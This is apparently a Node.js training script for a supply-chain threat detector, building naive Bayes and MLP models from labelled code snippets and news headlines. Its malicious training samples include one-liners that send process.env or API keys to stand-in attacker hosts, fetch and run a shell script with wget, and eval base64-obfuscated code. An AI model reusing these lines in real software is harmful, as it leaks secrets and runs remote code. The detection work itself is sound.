import { CODE_BIGRAMS, CODE_KEYWORDS, tokenizeCode, tokenizeText } from '../lib/ml/tokenizer.js';
import { trainMultinomialNB } from '../lib/ml/naive-bayes.js';
import { buildDocumentFrequency } from '../lib/ml/tfidf.js';
import { trainSimpleMLP } from '../lib/ml/mlp.js';
import { readFile, writeFile, mkdir } from 'node:fs/promises';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const modelsDir = join(__dirname, '..', 'data', 'models');

const benignCodeSamples = [
  'export function add(a, b) { return a + b; }',
  'const express = require("express"); app.get("/", (req, res) => res.send("ok"));',
  'import { readFile } from "node:fs/promises"; export async function load(path) { return readFile(path, "utf8"); }',
  'module.exports = { validateEmail(email) { return /^[^@]+@[^@]+$/.test(email); } };',
  'function formatDate(d) { return d.toISOString().slice(0, 10); }',
  'export const VERSION = "1.0.0";',
  'const debounce = (fn, ms) => { let t; return (...args) => { clearTimeout(t); t = setTimeout(() => fn(...args), ms); }; };',
  'class Queue { constructor() { this.items = []; } push(item) { this.items.push(item); } pop() { return this.items.shift(); } }',
];

const maliciousCodeSamples = [
  'eval(Buffer.from("YWRlcnQoMSk=", "base64").toString());',
  'const cp = require("child_process"); cp.exec(process.env.SECRET);',
  'fetch("https://evil.example/collect", { method: "POST", body: JSON.stringify(process.env) });',
  'new Function("return " + atob("ZXZhbCgxKQ=="))();',
  'require("child_process").spawn("curl", ["-d", process.env.API_KEY, "https://attacker.io"]);',
  'const data = process.env; require("https").request("https://bad.io", { method: "POST" }).end(JSON.stringify(data));',
  'eval("require(\\"child_process\\").exec(\\"wget http://x/p.sh|sh\\")");',
  'Buffer.from("cHJvY2Vzcy5lbnY=", "base64").toString(); fetch(process.env.WEBHOOK);',
];

const threatKeywords = JSON.parse(await readFile(join(modelsDir, 'threat-keywords.json'), 'utf8'));

const vocabulary = [...CODE_KEYWORDS, ...CODE_BIGRAMS.map((b) => `__bigram__:${b}`)];

const nbSamples = [
  ...benignCodeSamples.map((content) => ({ label: 'benign', tokens: tokenizeCode(content) })),
  ...maliciousCodeSamples.map((content) => ({ label: 'malicious', tokens: tokenizeCode(content) })),
];

const codeNbModel = trainMultinomialNB(nbSamples, vocabulary);
const corpusTokens = nbSamples.map((sample) => sample.tokens);
const documentFrequency = buildDocumentFrequency(corpusTokens);

const newsSamples = [
  { text: 'Critical vulnerability RCE in npm package lodash exploited in the wild', label: 1 },
  { text: 'Malware found in npm supply chain attack compromises thousands of projects', label: 1 },
  { text: 'CVE-2024-1234 remote code execution patch immediately', label: 1 },
  { text: 'Security advisory typosquat backdoor discovered in popular library', label: 1 },
  { text: 'How to improve your JavaScript coding style this summer', label: 0 },
  { text: 'Top 10 frontend frameworks opinion piece for beginners', label: 0 },
  { text: 'Company announces new office location and hiring plans', label: 0 },
  { text: 'Weekly digest of open source community events', label: 0 },
];

const newsVocab = [];
for (const sample of newsSamples) {
  const tokens = tokenizeText(sample.text, threatKeywords);
  for (const key of tokens.keys()) {
    if (!newsVocab.includes(key)) {
      newsVocab.push(key);
    }
  }
}

const newsMlpSamples = newsSamples.map((sample) => {
  const tokens = tokenizeText(sample.text, threatKeywords);
  const input = newsVocab.map((term) => tokens.get(term) ?? 0);
  return { input, label: sample.label };
});

const newsMlpModel = trainSimpleMLP(newsMlpSamples, newsVocab.length, 8, 300, 0.08);

const codeMlpSamples = [
  ...benignCodeSamples.map((content) => {
    const tokens = tokenizeCode(content);
    return { input: vocabulary.map((term) => tokens.get(term) ?? 0), label: 0 };
  }),
  ...maliciousCodeSamples.map((content) => {
    const tokens = tokenizeCode(content);
    return { input: vocabulary.map((term) => tokens.get(term) ?? 0), label: 1 };
  }),
];

const codeMlpModel = trainSimpleMLP(codeMlpSamples, vocabulary.length, 10, 400, 0.1);

await mkdir(modelsDir, { recursive: true });
await writeFile(join(modelsDir, 'code-nb-model.json'), `${JSON.stringify(codeNbModel, null, 2)}\n`);
await writeFile(
  join(modelsDir, 'code-tfidf-idf.json'),
  `${JSON.stringify({ totalDocuments: corpusTokens.length, documentFrequency, threshold: 2.5 }, null, 2)}\n`,
);
await writeFile(
  join(modelsDir, 'news-mlp-model.json'),
  `${JSON.stringify({ vocabulary: newsVocab, ...newsMlpModel }, null, 2)}\n`,
);
await writeFile(
  join(modelsDir, 'code-mlp-model.json'),
  `${JSON.stringify({ vocabulary, ...codeMlpModel }, null, 2)}\n`,
);

console.log('Models generated in data/models/');
